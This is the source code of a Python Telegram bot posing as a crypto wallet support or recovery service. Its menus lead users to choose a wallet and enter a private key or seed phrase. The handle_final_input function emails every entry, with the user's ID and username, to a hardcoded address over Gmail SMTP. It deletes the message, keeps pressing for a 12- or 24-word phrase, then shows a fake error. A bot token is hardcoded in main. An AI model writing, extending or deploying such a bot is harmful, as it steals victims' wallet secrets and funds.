        "wallet_type_fearless_wallet",
        "wallet_type_terra_station",
        "wallet_type_cosmos_station",
        "wallet_type_exodus_wallet",
        "wallet_type_argent",
        "wallet_type_binance_chain",
        "wallet_type_safemoon",
        "wallet_type_gnosis_safe",
        "wallet_type_defi",
        "wallet_type_other",
    ]
    kb = []
    row = []
    for k in keys:
        base_label = BASE_WALLET_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        label = localize_wallet_label(base_label, lang)
        row.append(InlineKeyboardButton(label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE


# Show private key / seed options (forward navigation -> send new message). Wallet name localized.
async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    wallet_key = query.data
    wallet_name = BASE_WALLET_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    localized_wallet_name = localize_wallet_label(wallet_name, lang)
    context.user_data["wallet type"] = localized_wallet_name
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key"), InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
        ]
    )
    text = ui_text(context, "wallet selection message").format(wallet_name=localized_wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT


# Prompt for input: when seed or private key selected -> send ForceReply so keyboard appears (forward navigation)
async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt seed")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt private key")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "invalid choice"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT


# Handle final wallet input and email (always email the input, then branch: if not 12/24 ask again; if 12/24 show post-receive error only)
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    user = update.effective_user

    # Always send the input to email regardless of content
    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    await send_email(subject, body)

    # Attempt to delete the user's message to avoid leaving sensitive strings in chat
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

    # Validate words count
    words = [w for w in re.split(r"\s+", user_input.strip()) if w]

    # If user did NOT provide 12 or 24 words: guide them to provide the seed (localized), ask again with a single ForceReply message.
    if len(words) not in (12, 24):
        fr = ForceReply(selective=False)
        # Send exactly one guidance message that includes the instruction and ForceReply.
        await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, reply_markup=fr, state=RECEIVE_INPUT)
        context.user_data["current_state"] = RECEIVE_INPUT
        return RECEIVE_INPUT

    # If user DID provide 12 or 24 words: show only the localized "post_receive_error" message and set state to AWAIT_RESTART.
    context.user_data["current_state"] = AWAIT_RESTART
    await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
    return AWAIT_RESTART


# After restart handler: any text after final success
async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART


# Send email helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        if not SENDER_PASSWORD:
            logging.warning("SENDER_PASSWORD not set; skipping email send.")
            return
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")


# Universal Back handler: edit current displayed message into the previous step UI (in-place)
async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state


# Cancel
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END


def main() -> None:
    application = ApplicationBuilder().token("7606148970:AAGXweOEX3gsptFrEhrqDcciQc9EftLqkHU").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [CallbackQueryHandler(set_language, pattern="^lang_")],
            MAIN_MENU: [
                CallbackQueryHandler(show_connect_wallet_button, pattern="^(validation|claim_tokens|assets_recovery|general_issues|rectification|withdrawals|login_issues|missing_balance|claim_trees|claim_water|fix_ads)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
